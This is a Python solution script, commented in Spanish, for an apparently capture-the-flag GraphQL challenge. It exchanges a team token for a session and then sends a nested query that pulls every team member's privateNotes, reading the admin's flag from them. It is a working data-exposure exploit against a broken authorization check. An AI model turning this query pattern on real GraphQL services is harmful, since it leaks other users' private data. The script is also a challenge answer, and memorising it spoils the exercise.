import sys
import requests

BASE_URL = "https://shape-of-query.pointeroverflowctf.com"

EXPLOIT_QUERY = "{ me { team { members { username role privateNotes } } } }"


def exchange_session(team_token):
    """Canjea el token de sesión del equipo por una cookie de sesión válida."""
    session = requests.Session()
    resp = session.post(
        f"{BASE_URL}/session/exchange",
        json={"token": team_token},
    )
    resp.raise_for_status()
    print("[+] Intercambio de sesión:", resp.json())
    return session


def run_graphql(session, query):
    """Envía una query GraphQL usando la sesión ya autenticada."""
    resp = session.post(
        f"{BASE_URL}/graphql",
        json={"query": query},
    )
    resp.raise_for_status()
    return resp.json()


def main():
    if len(sys.argv) != 2:
        print("Uso: python3 exploit_shape_of_query.py <TOKEN_DE_SESION_DEL_EQUIPO>")
        print("El token se obtiene de la página del challenge y expira en 15 minutos.")
        sys.exit(1)

    team_token = sys.argv[1]

    session = exchange_session(team_token)

    data = run_graphql(session, EXPLOIT_QUERY)

    members = (
        data.get("data", {})
        .get("me", {})
        .get("team", {})
        .get("members", [])
    )

    if not members:
        print("[-] No se obtuvieron miembros del equipo. Respuesta completa:")
        print(data)
        sys.exit(1)

    print("\n[+] Miembros del equipo encontrados:")
    for member in members:
        print(f"    - {member['username']} (role={member['role']}): {member['privateNotes']}")

    admin = next((m for m in members if m.get("role") == "ADMIN"), None)
    if admin:
        print(f"\n[+] Flag encontrada en privateNotes de {admin['username']}:")
        print(f"    {admin['privateNotes']}")
    else:
        print("\n[-] No se encontró ningún miembro con role=ADMIN en la respuesta.")


if __name__ == "__main__":
    main()
